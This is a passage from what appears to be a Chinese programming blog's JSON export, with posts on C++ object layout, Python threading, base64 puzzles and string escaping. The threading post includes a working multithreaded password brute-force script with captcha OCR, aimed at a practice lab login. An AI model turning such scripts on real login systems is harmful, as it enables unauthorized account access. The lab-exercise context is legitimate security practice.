size(8):1&gt; +---1&gt; 0 | +--- (base class X)1&gt; 0 | | x1&gt; | +---1&gt; 4 | y1&gt; +--- 不能看出子类中继承了父类的成员，现在我们在此基础上增加一个虚函数看看 123456789101112class X &#123; int x;public: virtual void funX() &#123;&#125;&#125;;class Y :public X &#123; int y;public: virtual void funY()&#123;&#125;&#125;; 结果为 12345678910111213141516171819202122232425262728291&gt; class X size(8):1&gt; +---1&gt; 0 | &#123;vfptr&#125;1&gt; 4 | x1&gt; +---1&gt;1&gt; X::$vftable@:1&gt; | &amp;X_meta1&gt; | 01&gt; 0 | &amp;X::funX1&gt;1&gt; X::funX this adjustor: 01&gt;1&gt; class Y size(12):1&gt; +---1&gt; 0 | +--- (base class X)1&gt; 0 | | &#123;vfptr&#125;1&gt; 4 | | x1&gt; | +---1&gt; 8 | y1&gt; +---1&gt;1&gt; Y::$vftable@:1&gt; | &amp;Y_meta1&gt; | 01&gt; 0 | &amp;X::funX1&gt; 1 | &amp;Y::funY1&gt;1&gt; Y::funY this adjustor: 0 注意这个结果里面多出来了一个东西vftable很明显这个根据字面意思可以知道，这是虚函数指针对应的虚函数表。这里还有另一个东西adjustor，这是什么？ adjustor表示虚函数机制执行时，this指针的调整量，假如fun被多态调用的话，那么它的形式如下： *(this+0)[0]() 总结虚函数调用形式，应该是： *(this指针+调整量)[虚函数在vftable内的偏移]() 还有最后这个结果中要说的最后一点是，关于vfptr的位置问题，如你所见，在vs2015中它是被编译器放在了类的最前面，但是不是所有的编译器都是这样的。ok，开始下一个话题。 多重继承问题依然从最简单的开始，不考虑virtual function 12345678910111213141516class X &#123; int x;&#125;;class Y :public X &#123; int y;&#125;;class Z :public X&#123; int z;&#125;;class A :public Y, public Z&#123; int a;&#125;; 结果是 123456789101112131415161718192021222324252627282930313233343536371&gt; class X size(4):1&gt; +---1&gt; 0 | x1&gt; +---1&gt;1&gt; class Y size(8):1&gt; +---1&gt; 0 | +--- (base class X)1&gt; 0 | | x1&gt; | +---1&gt; 4 | y1&gt; +---1&gt;1&gt; class Z size(8):1&gt; +---1&gt; 0 | +--- (base class X)1&gt; 0 | | x1&gt; | +---1&gt; 4 | z1&gt; +---1&gt;1&gt; class A size(20):1&gt; +---1&gt; 0 | +--- (base class Y)1&gt; 0 | | +--- (base class X)1&gt; 0 | | | x1&gt; | | +---1&gt; 4 | | y1&gt; | +---1&gt; 8 | +--- (base class Z)1&gt; 8 | | +--- (base class X)1&gt; 8 | | | x1&gt; | | +---1&gt; 12 | | z1&gt; | +---1&gt; 16 | a1&gt; +--- 我们这里注意到A的大小是20，结合结构图不难理解，好，现在增加virtual function 1234567891011121314151617181920212223242526class X &#123; int x;public: virtual void funX() &#123;&#125;&#125;;class Y :public X &#123; int y;public: virtual void funY()&#123;&#125;&#125;;class Z :public X&#123; int z;public: virtual void funZ() &#123;&#125;&#125;;class A :public Y, public Z&#123; int a;public: virtual void funA() &#123;&#125; virtual void funY() &#123;&#125; virtual void funZ() &#123;&#125;&#125;; 结果是 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980811&gt; class X size(8):1&gt; +---1&gt; 0 | &#123;vfptr&#125;1&gt; 4 | x1&gt; +---1&gt;1&gt; X::$vftable@:1&gt; | &amp;X_meta1&gt; | 01&gt; 0 | &amp;X::funX1&gt;1&gt; X::funX this adjustor: 01&gt;1&gt; class Y size(12):1&gt; +---1&gt; 0 | +--- (base class X)1&gt; 0 | | &#123;vfptr&#125;1&gt; 4 | | x1&gt; | +---1&gt; 8 | y1&gt; +---1&gt;1&gt; Y::$vftable@:1&gt; | &amp;Y_meta1&gt; | 01&gt; 0 | &amp;X::funX1&gt; 1 | &amp;Y::funY1&gt;1&gt; Y::funY this adjustor: 01&gt;1&gt; class Z size(12):1&gt; +---1&gt; 0 | +--- (base class X)1&gt; 0 | | &#123;vfptr&#125;1&gt; 4 | | x1&gt; | +---1&gt; 8 | z1&gt; +---1&gt;1&gt; Z::$vftable@:1&gt; | &amp;Z_meta1&gt; | 01&gt; 0 | &amp;X::funX1&gt; 1 | &amp;Z::funZ1&gt;1&gt; Z::funZ this adjustor: 01&gt;1&gt; class A size(28):1&gt; +---1&gt; 0 | +--- (base class Y)1&gt; 0 | | +--- (base class X)1&gt; 0 | | | &#123;vfptr&#125;1&gt; 4 | | | x1&gt; | | +---1&gt; 8 | | y1&gt; | +---1&gt; 12 | +--- (base class Z)1&gt; 12 | | +--- (base class X)1&gt; 12 | | | &#123;vfptr&#125;1&gt; 16 | | | x1&gt; | | +---1&gt; 20 | | z1&gt; | +---1&gt; 24 | a1&gt; +---1&gt;1&gt; A::$vftable@Y@:1&gt; | &amp;A_meta1&gt; | 01&gt; 0 | &amp;X::funX1&gt; 1 | &amp;A::funY1&gt; 2 | &amp;A::funA1&gt;1&gt; A::$vftable@Z@:1&gt; | -121&gt; 0 | &amp;X::funX1&gt; 1 | &amp;A::funZ1&gt;1&gt; A::funA this adjustor: 01&gt; A::funY this adjustor: 01&gt; A::funZ this adjustor: 12 这里出现一个有意思的问题，在多重继承下，子类有两个虚函数表，分别来自两个父类，其中一个虚函数表中包含了子类的虚函数，而另一个没有。如果子类重写了任意父类的虚函数，都会覆盖对应的函数地址记录。 在这里我们发现A::funZ的函数对应的adjustor值是12，按照我们前边的规则，可以发现该函数的多态调用形式为： *(this+12)[1]() 此处的调整量12正好是Z的vfptr在A对象内的偏移量。 这里我们注意到在子类A中有两个X，分别是Y中的X和Z中的X，这种做法我们认为是对内存的一种浪费，怎么解决这个问题呢？就引出了虚拟继承。 虚拟继承1234567891011121314151617181920212223242526class X &#123; int x;public: virtual void funX() &#123;&#125;&#125;;class Y :virtual public X &#123; int y;public: virtual void funY()&#123;&#125;&#125;;class Z :virtual public X&#123; int z;public: virtual void funZ() &#123;&#125;&#125;;class A :public Y, public Z&#123; int a;public: virtual void funA() &#123;&#125; virtual void funY() &#123;&#125; virtual void funZ() &#123;&#125;&#125;; 结果是 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151&gt; class X size(8):1&gt; +---1&gt; 0 | &#123;vfptr&#125;1&gt; 4 | x1&gt; +---1&gt;1&gt; X::$vftable@:1&gt; | &amp;X_meta1&gt; | 01&gt; 0 | &amp;X::funX1&gt;1&gt; X::funX this adjustor: 01&gt;1&gt; class Y size(20):1&gt; +---1&gt; 0 | &#123;vfptr&#125;1&gt; 4 | &#123;vbptr&#125;1&gt; 8 | y1&gt; +---1&gt; +--- (virtual base X)1&gt; 12 | &#123;vfptr&#125;1&gt; 16 | x1&gt; +---1&gt;1&gt; Y::$vftable@Y@:1&gt; | &amp;Y_meta1&gt; | 01&gt; 0 | &amp;Y::funY1&gt;1&gt; Y::$vbtable@:1&gt; 0 | -41&gt; 1 | 8 (Yd(Y+4)X)1&gt;1&gt; Y::$vftable@X@:1&gt; | -121&gt; 0 | &amp;X::funX1&gt;1&gt; Y::funY this adjustor: 01&gt; vbi: class offset o.vbptr o.vbte fVtorDisp1&gt; X 12 4 4 01&gt;1&gt; class Z size(20):1&gt; +---1&gt; 0 | &#123;vfptr&#125;1&gt; 4 | &#123;vbptr&#125;1&gt; 8 | z1&gt; +---1&gt; +--- (virtual base X)1&gt; 12 | &#123;vfptr&#125;1&gt; 16 | x1&gt; +---1&gt;1&gt; Z::$vftable@Z@:1&gt; | &amp;Z_meta1&gt; | 01&gt; 0 | &amp;Z::funZ1&gt;1&gt; Z::$vbtable@:1&gt; 0 | -41&gt; 1 | 8 (Zd(Z+4)X)1&gt;1&gt; Z::$vftable@X@:1&gt; | -121&gt; 0 | &amp;X::funX1&gt;1&gt; Z::funZ this adjustor: 01&gt; vbi: class offset o.vbptr o.vbte fVtorDisp1&gt; X 12 4 4 01&gt;1&gt; class A size(36):1&gt; +---1&gt; 0 | +--- (base class Y)1&gt; 0 | | &#123;vfptr&#125;1&gt; 4 | | &#123;vbptr&#125;1&gt; 8 | | y1&gt; | +---1&gt; 12 | +--- (base class Z)1&gt; 12 | | &#123;vfptr&#125;1&gt; 16 | | &#123;vbptr&#125;1&gt; 20 | | z1&gt; | +---1&gt; 24 | a1&gt; +---1&gt; +--- (virtual base X)1&gt; 28 | &#123;vfptr&#125;1&gt; 32 | x1&gt; +---1&gt;1&gt; A::$vftable@Y@:1&gt; | &amp;A_meta1&gt; | 01&gt; 0 | &amp;A::funY1&gt; 1 | &amp;A::funA1&gt;1&gt; A::$vftable@Z@:1&gt; | -121&gt; 0 | &amp;A::funZ1&gt;1&gt; A::$vbtable@Y@:1&gt; 0 | -41&gt; 1 | 24 (Ad(Y+4)X)1&gt;1&gt; A::$vbtable@Z@:1&gt; 0 | -41&gt; 1 | 12 (Ad(Z+4)X)1&gt;1&gt; A::$vftable@X@:1&gt; | -281&gt; 0 | &amp;X::funX1&gt;1&gt; A::funA this adjustor: 01&gt; A::funY this adjustor: 01&gt; A::funZ this adjustor: 121&gt; vbi: class offset o.vbptr o.vbte fVtorDisp1&gt; X 28 4 4 0 结果比较复杂，用一张图概括就是 我们可以看到。这里的class A内部只有一个class X了，这张图有个小的错误，就是y和z的vbtable后面少画了一个0。这个0是作为一种标记，标记这个表的结束位置。vbtable表中的-4指的是y和z的vbtable相对于自身的偏移。24表示的是y的vbtable距离x的vfptr的偏移，同样的12表示的是z的vbtable距离x的vfptr的偏移。至此所有问题全部解决了？ 等一下，还有一个问题呢！！！编译器生成的表中有的虚函数表的前面都会有这样 _meta 结尾，这个是什么呢？深度探索c++对象模型(7).html)","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"深度探索c++对象模型(3)","slug":"2017-08-06-深度探索c++对象模型(3)","date":"2017-08-05T16:00:00.000Z","updated":"2018-02-18T03:29:07.107Z","comments":true,"path":"2017/08/06/2017-08-06-深度探索c++对象模型(3)/","link":"","permalink":"http://coordinate.wang/2017/08/06/2017-08-06-深度探索c++对象模型(3)/","excerpt":"","text":"当一个类对象以另一个同类实体作为初值时，大部分情况下会调用拷贝构造函数。一般是这三种具体情况： 显式地以一个类对象作为另一个类对象的初值，形如X xx=x; 当类对象被作为参数交给函数时。 当函数返回一个类对象时。 后两种情形会产生一个临时对象。 如果一个类没有定义拷贝构造函数，通常按照“成员逐一初始化(Default Memberwise Initialization)”的手法来解决“一个类对象以另一个同类实体作为初值”——也就是说把内建或派生的数据成员从某一个对象拷贝到另一个对象身上，如果数据成员是一个对象，则递归使用“成员逐一初始化(Default Memberwise Initialization)”的手法。 对于默认的拷贝构造函数不会使用深拷贝，它只是使用浅拷贝（位逐次拷贝）。 有以下几种情况之一，位逐次拷贝将不能胜任或者不适合来完成“一个类对象以另一个同类实体作为初值”的工作。此时，如果类没有定义拷贝构造函数，那么编译器将必须为类合成一个拷贝构造函数。 当类内含一个成员对象，而后者的类声明有一个拷贝构造函数时（不论是设计者定义的还是编译器合成的）。 当类继承自一个声明有拷贝构造函数的类时（同样，不论这个拷贝构造函数是被显示声明还是由编译器合成的）。 类中声明有虚函数。 当类的派生串链中包含有一个或多个虚基类。 对于前两种情况，不论是基类还是对象成员，既然后者声明有拷贝构造函数时，就表明其类的设计者或者编译器希望以其声明的拷贝构造函数来完成“一个类对象以另一个同类实体作为初值”的工作，而设计者或编译器这样做——声明拷贝构造函数，总有它们的理由，而通常最直接的原因莫过于因为他们想要做一些额外的工作或“位逐次拷贝”无法胜任。对于有虚函数的类，如果两个对象的类型相同那么位逐次拷贝其实是可以胜任的。但问题将出在，如果基类由其继承类进行初始化时，此时若按照位逐次拷贝来完成这个工作，那么基类的vptr将指向其继承类的虚函数表，这将导致无法预料的后果——调用一个错误的虚函数实体是无法避免的，轻则带来程序崩溃，更糟糕的问题可能是这个错误被隐藏了。所以对于有虚函数的类编译器将会明确的使被初始化的对象的vptr指向正确的虚函数表。因此有虚函数的类没有声明拷贝构造函数，编译将为之合成一个，来完成上述工作，以及初始化各数据成员，声明有拷贝构造函数的话也会被插入完成上述工作的代码。 12345678910111213141516171819202122class Foo&#123;public: int a; Foo *next; virtual void Func(void)&#123;cout&lt;&lt;\"call Foo::func()\"&lt;&lt;endl;&#125;&#125;;class D:public Foo&#123;public: int c; virtual void Func(void)&#123;cout&lt;&lt;\"call D::func()\"&lt;&lt;endl;&#125;&#125;;int main(void)&#123; D d; Foo f=d; d.Func(); //call D::func() f.Func(); //call Foo::func() system(\"pause\"); return 0;&#125; 当含有虚函数的时候，我们的类会有虚函数表，每个对象会有vptr。如果我们的基类只是简单的将子类的vptr值拷贝过来，显然是不符合要求的，于是这个时候编译器会给我们自动的停用bitwise拷贝，而用reset将基类的vptr指向基类的虚函数表。所以这个时候是达到了我们的要求的。我想说的是，其他值会按照默认的按位拷贝，只是vptr不会，还有我们下一个将讨论的也不会。 对于继承串链中有虚基类的情况，问题同样出现在继承类向基类提供初值的情况，此时位逐次拷贝有可能破坏对象中虚基类子对象的位置。 1234567891011121314class Raccoon : public virtual ZooAnimal&#123;public: Raccoon() &#123; /* private data initialization */ &#125; Raccoon( int val ) &#123; /* private data initialization */ &#125; // ... private: // all necessary data &#125;;class RedPanda : public Raccoon&#123;public: RedPanda() &#123; /* private data initialization */ &#125; RedPanda( int val ) &#123; /* private data initialization */ &#125; // ... private: // all necessary data&#125;; 这里如果是两个一样的类的对象间进行拷贝，简单的按位拷贝就会解决问题，而我们的问题在于父类与子类之间的拷贝； 12RedPanda little_red; Raccoon little_critter = little_red; 这个时候，编译器会在默认的拷贝构造函数中插入初始化指向虚基类的指针，而不是reset。 必须用到初始化列表的情况： 有const成员 有引用类型成员 调用一个基类的构造函数，这个构造函数拥有一组参数 调用一个成员对象的构造函数，这个构造函数拥有一组参数","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"深度探索c++对象模型(2)","slug":"2017-08-05-深度探索c++对象模型(2)","date":"2017-08-04T16:00:00.000Z","updated":"2018-02-18T03:29:07.101Z","comments":true,"path":"2017/08/05/2017-08-05-深度探索c++对象模型(2)/","link":"","permalink":"http://coordinate.wang/2017/08/05/2017-08-05-深度探索c++对象模型(2)/","excerpt":"","text":"通常很多C++程序员存在两种误解： 没有定义默认构造函数的类都会被编译器生成一个默认构造函数。 编译器生成的默认构造函数会明确初始化类中每一个数据成员。 ​ C++标准规定：如果类的设计者并未为类定义任何构造函数，那么会有一个默认构造函数被暗中生成，而这个暗中生成的默认构造函数通常是不做什么事的(无用的)，下面四种情况除外。 包含有带默认构造函数的对象成员的类 继承自带有默认构造函数的基类的类 带有虚函数的类 带有一个虚基类的类 ​ 如果类虚继承自基类，编译器将在所有构造函数中插入准备虚基类位置的代码和提供支持虚基类机制的代码。 如果类声明有虚函数，那么编译器将为之生成虚函数表以存储虚函数地址，并将虚函数指针（vptr）的初始化代码插入到类的所有构造函数中。 如果类的父类有默认构造函数，编译将会对所有的默认构造函数插入调用其父类必要的默认构造函数。必要是指设计者没有显示初始化其父类，调用顺序，依照其继承时声明顺序。 如果类包含带有默认构造函数的对象成员，那么编译器将会为所有的构造函数插入对这些对象成员的默认构造函数进行必要的调用代码，所谓必要是指类设计者设计的构造函数没有对对象成员进行显式初始化。成员对象默认构造函数的调用顺序，依照其声明顺序。 若类没有定义任何构造函数，编译器会为其合成默认构造函数，再执行上述四点。 C++标准将合成的默认构造函数分为 trivial 和 notrivial 两种，前文所述的四种情况对应于notrivial默认构造函数，其它情况都属于trivial。对于一个trivial默认构造函数，编译器的态度是，既然它全无用处，干脆就不合成它。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"深度探索c++对象模型(1)","slug":"2017-08-04-深度探索c++对象模型(1)","date":"2017-08-03T16:00:00.000Z","updated":"2018-02-18T03:29:07.094Z","comments":true,"path":"2017/08/04/2017-08-04-深度探索c++对象模型(1)/","link":"","permalink":"http://coordinate.wang/2017/08/04/2017-08-04-深度探索c++对象模型(1)/","excerpt":"","text":"C++在布局以及存取时间上主要的额外负担是由virtual引起的，包括virtual function机制和virtual base class，此外，还有一些多重继承下的额外负担。 在C中将一个一个元素的数组放在struct的末尾，可以令每个struct的对象拥有可变数组。 123456789struct mumble &#123; /* stuff */ char pc[ 1 ]; &#125;; // grab a string from file or standard input // allocate memory both for struct &amp; string struct mumble *pmumb1 = ( struct mumble* ) malloc(sizeof(struct mumble)+strlen(string)+1); strcpy(pmumb1-&gt;pc, string ); 指针 pmumb1 指向的是 malloc 所分配的整个内存，而 pmumb1-&gt;pc 指向的是这块内存的第一个字节，因为 malloc` 操作为整个 string 分配了足够的内存，所以在strcpy时，虽然溢出了 pc 的内存范围，但没有溢出struct的内存范围，使得strcpy的结果是合理的和可控的。这样一来，相当于struct` 拥有了可变大小的数组，更加灵活。这是一个很有意思的小技巧，但是别在C++中使用。 C++通过下面的方法支持多态： 经由一组隐含的转化操作。例如把一个derived class指针转化为一个指向其public base type的指针 经由virtual function机制 经由dynamic_cast和typeid运算符","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"}]},{"title":"13位字母排列组合的base64解码","slug":"2017-08-03-13位字母排列组合的base64解码","date":"2017-08-02T16:00:00.000Z","updated":"2018-02-18T03:29:07.076Z","comments":true,"path":"2017/08/03/2017-08-03-13位字母排列组合的base64解码/","link":"","permalink":"http://coordinate.wang/2017/08/03/2017-08-03-13位字母排列组合的base64解码/","excerpt":"","text":"今天碰到这样一个问题：小明今天去妹纸家开 Party, 而妹纸却给他出了一个谜语, 说只要他能答出来, 她就会答应小明一个要求。这是妹纸给小明的谜语序列:AGV5IULSB3ZLVSE= 第一眼看到这个字符串，认为是base64加密，随即解密后是一串乱码，问题果然没有这么简单。再仔细看，发现字符串全是英文大写，所以猜测可能将小写改为了大写，总共有8192 种变化 先看这样的做法： 1234567891011121314151617181920212223from base64 import *import redef basepass(res, arr, pos): res.append(''.join(arr)) i = pos for i in xrange(i, len(arr)): if arr[i] &gt;= 'A' and arr[i] &lt;= 'Z': #这个解法非常妙，有点类似于排列的做法 arr[i] = arr[i].lower() #先挑选一个字母变为小写 basepass(res, arr, i + 1) #从剩余的子母中挑选一个字母变为小写 arr[i] = arr[i].upper() #原先变为小写的字母变为大写arr = list('AGV5IULSB3ZLVSE=')res = []basepass(res, arr, 0)res_decode = map(b64decode, res)for i in res_decode: if re.findall(r'\\\\x', repr(i)): #这里有一个陷阱，可以参看我的另一篇文章 continue else: print i 另一种做法是： 12345678910111213import base64,refrom itertools import combinationss=list('AGV5IULSB3ZLVSE=')for i in range(len(s)): for j in list(combinations([x for x in range(len(s))], i)): #combinations是一个组合函数 a=list(s) for k in j: a[k]= a[k].lower() r=repr(base64.b64decode(''.join(a))) if '\\\\x' not in r: print r[1:-1]","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"算法","slug":"算法","permalink":"http://coordinate.wang/tags/算法/"},{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"排列组合","slug":"排列组合","permalink":"http://coordinate.wang/tags/排列组合/"}]},{"title":"第100篇","slug":"2017-08-02-第100篇","date":"2017-08-01T16:00:00.000Z","updated":"2018-02-18T03:29:07.076Z","comments":true,"path":"2017/08/02/2017-08-02-第100篇/","link":"","permalink":"http://coordinate.wang/2017/08/02/2017-08-02-第100篇/","excerpt":"","text":"仅以此文纪念","categories":[{"name":"index","slug":"index","permalink":"http://coordinate.wang/categories/index/"}],"tags":[{"name":"Eassy","slug":"Eassy","permalink":"http://coordinate.wang/tags/Eassy/"}]},{"title":"Python多线程","slug":"2017-08-01-Python多线程","date":"2017-07-31T16:00:00.000Z","updated":"2018-02-18T03:29:07.060Z","comments":true,"path":"2017/08/01/2017-08-01-Python多线程/","link":"","permalink":"http://coordinate.wang/2017/08/01/2017-08-01-Python多线程/","excerpt":"","text":"0x01 创建多线程通常有两种方式添加多线程，一种是import thread，另一种是import threading，我们主要使用后者，因为后者的功能更加全面。 123456789import threadingimport time def thread(): ...t = threading.Thread(target=thread) t.start()t.join() start是启动线程，join是阻塞当前线程，即使得在当前线程结束时，不会退出。 0x02 线程锁首先我们要了解什么是死锁。假设有两个全局资源，a和b，有两个线程thread1，thread2。thread1占用a，想访问b，但此时thread2占用b，想访问a，两个线程都不释放此时拥有的资源，那么就会造成死锁。 为了解决这个问题，就要使用Lock。 当访问某个资源之前，用Lock.acquire()锁住资源,访问之后，用Lock.release()释放资源。 0x03 ThreadLocalthreadlocal是为了解决线程中全局变量的问题。通过在线程中定义：local = threading.local()，此时这个local就变成了一个全局变量，但这个全局变量只在该线程中为全局变量，对于其他线程来说是局部变量，别的线程不可更改。 我用多线程写了这样一个破解脚本解决了这个问题逗比的手机验证码，用多线程的话破解速度非常的快基本上只用了几秒钟。另外这个脚本中添加了验证码识别，使用python做验证码识别真的非常简洁，但是识别率根据图像变化很大的，有的图很难识别出来。就目前来看是个非常鸡肋的功能。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import requestsimport reimport threadingimport pytesseractfrom PIL import Imageurl = r\"http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/index.php\"login = r\"http://lab1.xseclab.com/vcode1_bcfef7eacf7badc64aaf18844cdb1c46/login.php\"v4_session = requests.Session()url_content = v4_session.get(url).content print url_content#验证码识别def vcode(): pic_url = re.findall(re.compile(r'&lt;img src=\"(.*?)\"&gt;'), url_content) pic= requests.get(pic_url[0], timeout=10) f = open('C:\\Python27\\code.jpg', 'wb') f.write(pic.content) f.close() im = Image.open('C:\\Python27\\code.jpg') text = pytesseract.image_to_string(im) if len(text) == 4: return text else: return 0flag = Falsefirst = 1000second = 10000lock = threading.Lock()code = vcode()print code#多线程破解def thread(): global flag global first global second while not flag: lock.acquire() first = first + 1 lock.release() data = &#123;'username':'admin', 'pwd':first, 'vcode':code,'submit':'submit'&#125; header = &#123;'Cookie': 'PHPSESSID=a07cfae155b086fc57776e9d1e78721f'&#125; f = v4_session.post(login, data=data, headers = header) if 'error' not in f.content: print first print f.content flag = True break else: print 'try: ',first#创建线程threadNum = 10 threadlist = [] for i in range(threadNum): threadlist.append(threading.Thread(target = thread)) for i in threadlist: i.start() for i in threadlist: i.join()","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"threading","slug":"threading","permalink":"http://coordinate.wang/tags/threading/"},{"name":"pytesseract","slug":"pytesseract","permalink":"http://coordinate.wang/tags/pytesseract/"}]},{"title":"AttributeError 'NoneType' object has no attribute 'bands'","slug":"2017-07-31-AttributeError","date":"2017-07-30T16:00:00.000Z","updated":"2018-02-18T03:29:07.060Z","comments":true,"path":"2017/07/31/2017-07-31-AttributeError/","link":"","permalink":"http://coordinate.wang/2017/07/31/2017-07-31-AttributeError/","excerpt":"","text":"今天做一个验证码检测的测试，出现这样的错误AttributeError: &#39;NoneType&#39; object has no attribute &#39;bands&#39; 原因在于Image库中的一个bug 解决办法 123456789101112def split(self): \"Split image into bands\" self.load() #移到这个位置，还要注意一点是，前面如果是空8个，就老老实实的打空格，不要按tab键，会报错的！！！ if self.im.bands == 1: ims = [self.copy()] else: #self.load() ims = [] for i in range(self.im.bands): ims.append(self._new(self.im.getband(i))) return tuple(ims)","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"PIL","slug":"PIL","permalink":"http://coordinate.wang/tags/PIL/"}]},{"title":"UnicodeDecodeError 'ascii' codec can't decode","slug":"2017-07-30-UnicodeDecodeError asciicodec cant decode","date":"2017-07-29T16:00:00.000Z","updated":"2018-02-18T03:29:07.054Z","comments":true,"path":"2017/07/30/2017-07-30-UnicodeDecodeError asciicodec cant decode/","link":"","permalink":"http://coordinate.wang/2017/07/30/2017-07-30-UnicodeDecodeError asciicodec cant decode/","excerpt":"","text":"string本身是不能encode的，如果想要encode，先要转化成unicode，此时采用默认的ascii进行转化，所以就出错了。 解决办法 指明str转化成unicode的编码方式： 12345#! /usr/bin/env python # -*- coding: utf-8 -*- s = '中文' s.decode('utf-8').encode('gbk') 重置变量 sys.defaultencoding 123456import sys reload(sys) # Python2.5 初始化后会删除 sys.setdefaultencoding 这个方法，我们需要重新载入 sys.setdefaultencoding('utf-8') str = '中文' str.encode('gbk')","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"re","slug":"re","permalink":"http://coordinate.wang/tags/re/"}]},{"title":"快速口算","slug":"2017-07-29-快速口算","date":"2017-07-28T16:00:00.000Z","updated":"2018-02-18T03:29:07.045Z","comments":true,"path":"2017/07/29/2017-07-29-快速口算/","link":"","permalink":"http://coordinate.wang/2017/07/29/2017-07-29-快速口算/","excerpt":"","text":"小明要参加一个高技能比赛，要求每个人都要能够快速口算四则运算，2秒钟之内就能够得到结果，但是小明就是一个小学生没有经过特殊的培训，那小明能否通过快速口算测验呢？ 问题的难点是在于要在短时间内计算和提交数据，这个问题非常的实用。我是通过以下脚本破之： 12345678910import reimport requestsurl = r'http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php't_session = requests.Session()get_url = t_session.get(url)res = unicode(get_url.content, 'utf-8').encode('gbk')num = re.findall(re.compile(r'&lt;br/&gt;\\s+(.*?)='), res)[0]get_url = t_session.post(url, data=&#123;'v': eval(num)&#125;)print re.findall(re.compile(r'&lt;body&gt;(.*?)&lt;/body&gt;'), get_url.content)[0]","categories":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"http://coordinate.wang/tags/python/"},{"name":"requests","slug":"requests","permalink":"http://coordinate.wang/tags/requests/"},{"name":"re","slug":"re","permalink":"http://coordinate.wang/tags/re/"}]},{"title":"python中的反斜杠问题","slug":"2017-07-26-python中的反斜杠问题","date":"2017-07-25T16:00:00.000Z","updated":"2018-02-18T03:29:07.036Z","comments":true,"path":"2017/07/26/2017-07-26-python中的反斜杠问题/","link":"","permalink":"http://coordinate.wang/2017/07/26/2017-07-26-python中的反斜杠问题/","excerpt":"","text":"0x01 问题引入首先我们要弄清楚，什么是转义字符，以下文字摘自百度百科 所有的ASCII码都可以用“\\”加数字（一般是8进制数字）来表示。而C中定义了一些字母前加”\\”来表示常见的那些不能显示的ASCII字符，如\\0,\\t,\\n等，就称为转义字符，因为后面的字符，都不是它本来的ASCII字符意思了。 如果我们要在字符串中使用\\，必须在前面加上转义符\\\\ ，当然在python中也可以这样写r&#39;\\&#39; ，只要在字符串前面加r即可。 这里我们要注意一个细节当反斜杠及其紧接字符无法构成一个具有特殊含义的序列(‘recognized escape sequences’)时,Python选择保留全部字符. 12345678910&gt;&gt;&gt; '\\c''\\\\c'&gt;&gt;&gt; '\\\\c''\\\\c'&gt;&gt;&gt; '\\n''\\n'&gt;&gt;&gt; r'\\n''\\\\n'&gt;&gt;&gt; '\\\\n''\\\\n' 0x02 正则表达式中的’\\’如果我们想在目标中匹配\\ ，我们根据前面的只是可以轻松写出这样的代码 123456import redata = '目标\\数据' #其实是'目标\\\\数据'if re.findall('\\\\', data): print 'OK'else: print 'Fail' 可是运行时报错：sre_constants.error: bogus escape: &#39;\\\\&#39; ， 这是为什么呢？ 原因在于正则表达式中存在一种转义，例如&#39;\\d&#39;代表数字，&#39;\\s&#39;代表空白符。也就是说在正则表达式中要做两次转义（一个是字符串，一个是正则表达式）。那上面的错误就很好理解了\\\\ 经过字符串转义后变为了\\ ，但是这个时候还要做一次正则转义，自然就报错了。解决办法也很简单r&#39;\\\\&#39; 。 接下来又会想到这样一个问题，我们怎么匹配字符串中的&#39;\\n&#39; 呢？是这样做吗？ 123456import redata = r'目标\\n数据' #其实是'目标\\\\n数据'if re.findall(r'\\\\n', data): print 'OK'else: print 'fail' 结果是OK，也就是说我们的理解是正确的。如果这里我们把\\n理解为换行符的话代码就要变味 123456import redata = '目标\\n数据' #其实是'目标\\n数据'if re.findall('\\\\n', data): print 'OK'else: print 'fail' 但是这样问题又来了，如果字符串转义后的字符在正则表达式中有意义怎么办？ 123&gt;&gt;&gt; '\\b''\\x08'&gt;&gt;&gt; re.findall('\\\\b','\\b') #这里的结果是['\\x08']吗？ 结果不是，结果是[] 。记下这句话b0123456789比较特殊,它们在Python字面量和re正则中都能和反斜杠构成作用不同的特殊序列.例如\\b,在python 字面量中解释为”退格键”.re正则中解释为’单词边界’。python 字面量有优先解释权。 在正则表达式中有这样一个细节，当反斜杠及其紧接字符无法构成一个具有特殊含义的序列(special sequences)时,re选择忽略反斜杠 。 例如: 1234&gt;&gt;&gt; re.findall('\\e','eee') #注意还是上面的法则这里'\\e'其实是'\\\\e'['e', 'e', 'e']&gt;&gt;&gt; re.findall('e','eee')['e', 'e', 'e'] 最后一个非常好的例子： 123456789101112131415161718192021222324&gt;&gt;&gt; re.findall('\\n','\\n\\n')['\\n', '\\n']&gt;&gt;&gt; re.findall('\\\\n','\\n\\n')['\\n', '\\n']&gt;&gt;&gt; 